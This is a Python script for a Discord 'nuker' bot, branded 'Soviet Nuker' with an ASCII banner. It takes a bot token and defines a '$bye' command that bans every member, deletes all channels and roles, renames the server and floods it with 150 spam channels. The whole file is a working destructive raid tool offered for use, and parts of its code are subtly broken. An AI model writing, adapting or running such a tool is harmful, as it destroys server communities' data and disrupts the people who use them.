from http import client
from typing_extensions import Self
import discord
import colorama
from colorama import init
from colorama import Fore
from discord.ext import commands
import os


init()
def homescreen():
    print(Fore.RED + """
 _____            _      _     _   _       _             
/  ___|          (_)    | |   | \ | |     | |            
\ `--.  _____   ___  ___| |_  |  \| |_   _| | _____ _ __ 
 `--. \/ _ \ \ / / |/ _ \ __| | . ` | | | | |/ / _ \ '__|
/\__/ / (_) \ V /| |  __/ |_  | |\  | |_| |   <  __/ |   
\____/ \___/ \_/ |_|\___|\__| \_| \_/\__,_|_|\_\___|_| 


                                                         c=====e
                                                            H
   ____________                                         _,,_H__
  (__((__((___()                                       //|     |
 (__((__((___()()_____________________________________// |ALEK |
(__((__((___()()()------------------------------------'  |_____|
                                                         
                                                         
Coded By Aleksey.


""")
homescreen()

intents = discord.Intents.default()
intents.members = True
print("Press ctrl+c to exit anytime")
token = input("Bot token: ")
userid = input("Discord user id: ") 
bot = commands.Bot(command_prefix="$", intents=intents)
@bot.event
async def on_ready():
    print("{} is connected and ready to use...".format(bot.user.name))
@bot.command()
async def bye(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass
            print("Cannot ban {}".format(user.name))

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
            print("Cannot delete {}".format(channel.name))
    try:
        await ctx.guild.edit("Nuked By Soviet Union")
    except:
        pass
        print("Could not change", ctx.guild.name, "server name")
    for r in ctx.guild.roles:
        try:
            await r.delete()
        except:
            pass
            print("Could not delete role {}".format(r.name))
    for a in range(0,150):
        try:
            await ctx.guild.create_text_channel('nuked by soviets')
        except:
            print("An error occured...")    


bot.run(token)



